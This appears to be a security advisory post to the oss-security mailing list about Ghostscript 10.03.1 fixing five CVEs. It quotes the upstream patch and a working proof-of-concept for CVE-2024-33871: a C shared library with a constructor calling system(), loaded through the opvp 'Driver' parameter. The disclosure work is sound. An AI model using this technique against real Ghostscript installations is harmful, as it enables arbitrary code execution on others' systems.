@@ -1,0 +1,112 @@
+
+Date: Fri, 28 Jun 2024 05:34:45 +0200
+From: Solar Designer <solar@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: Ghostscript 10.03.1 (2024-05-02) fixed 5 CVEs including CVE-2024-33871 arbitrary code execution
+
+Hi,
+
+Ghostscript 10.03.1 (2024-05-02) release notes:
+
+https://ghostscript.readthedocs.io/en/gs10.03.1/News.html
+
+mentions this:
+
+> - Fixes for CVE-2024-33869, CVE-2023-52722, CVE-2024-33870,
+> CVE-2024-33871 and CVE-2024-29510
+
+> - A vulnerability was identified in the way Ghostscript/GhostPDL called
+> tesseract for the OCR devices, which could allow arbitrary code
+> execution. As as result, we strongly urge anyone including the OCR
+> devices in their build to update as soon as possible.
+
+Out of these, CVE-2024-33871 is probably the worst (CVSS 8.8 and
+Important per Red Hat):
+
+https://access.redhat.com/security/cve/CVE-2024-33871
+
+> A flaw was found in Ghostscript. The "Driver" parameter for the
+> "opvp"/"oprp" device specifies the name of a dynamic library and allows
+> any library to be loaded. This flaw allows a malicious user to send a
+> specially crafted document that, when processed by Ghostscript, could
+> potentially lead to arbitrary code execution with the privileges of the
+> Ghostscript process on the system.
+
+(recently patched in RHEL 8 and 9, and thus in the RHEL rebuild distros)
+
+There's a patch and a reproducer for it in upstream Bugzilla:
+
+https://bugs.ghostscript.com/show_bug.cgi?id=707754
+
+> zhutyra 2024-04-21 15:27:29 UTC
+> 
+> Created attachment 25611 [details]
+> patch
+
++++ a/contrib/opvp/gdevopvp.c
+@@ -3456,6 +3456,12 @@ _put_params(gx_device *dev, gs_param_list *plist)
+     code = param_read_string(plist, pname, &vdps);
+     switch (code) {
+     case 0:
++        if (gs_is_path_control_active(dev->memory)
++            && (!opdev->globals.vectorDriver || strlen(opdev->globals.vectorDriver) != vdps.size
++                || memcmp(opdev->globals.vectorDriver, vdps.data, vdps.size) != 0)) {
++            param_signal_error(plist, pname, gs_error_invalidaccess);
++            return_error(gs_error_invalidaccess);
++        }
+         buff = realloc(buff, vdps.size + 1);
+         memcpy(buff, vdps.data, vdps.size);
+         buff[vdps.size] = 0;
+
+> The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.
+> 
+> The patch does not allow changing this parameter after activating path control.
+> 
+> Comment 1 zhutyra 2024-04-21 15:29:14 UTC
+> 
+> Created attachment 25612 [details]
+> exploit
+> 
+> Exploit for x86_64 Linux.
+> ```
+> $ gs -q -dNODISPLAY opvplib.ps
+> uid=1000(user) gid=1000(user) groups=1000(user)
+> ```
+> 
+> The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually.
+> ```
+> $ cat >lib.c <<"EOF"
+> #include <stdlib.h>
+> static void __attribute__ ((constructor)) init(void) {
+>     exit(system("id"));
+> }
+> EOF
+> $ gcc -fPIC -shared -o /tmp/lib.so lib.c
+> $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice'
+> uid=1000(user) gid=1000(user) groups=1000(user)
+
+The second attachment (exploit) gives me "Sorry, you are not authorized
+to access attachment #25612." but apparently it's just a precompiled
+version of what's included in the comment body, above, so not required
+to exploit the issue.  A colleague has tested the above exploit on
+latest CentOS 7 and it just worked (now patched in CIQ's CentOS Bridge).
+
+CVE-2024-33870 is also pretty bad:
+
+https://access.redhat.com/security/cve/CVE-2024-33870
+
+> A flaw was found in Ghostscript. When the gp_validate_path_len function
+> validates a path, it distinguishes between absolute and relative paths.
+> In the case of relative paths, it will check the path with and without
+> the current-directory-prefix ("foo" and "./foo"). This does not take
+> into account paths with a parent-directory-prefix. Therefore, a path
+> like "../../foo" is also tested as "./../../foo" and if the current
+> directory "./" is in the permitted paths, it will pass the check, which
+> may allow arbitrary file access.
+
+The remaining 3 CVEs are also serious, although they have lower scores.
+
+The CVE records for all four 2024 CVEs above still merely say "reserved
+by a CNA", without descriptions.  The 2023 CVE has proper info in it.
+
+Alexander
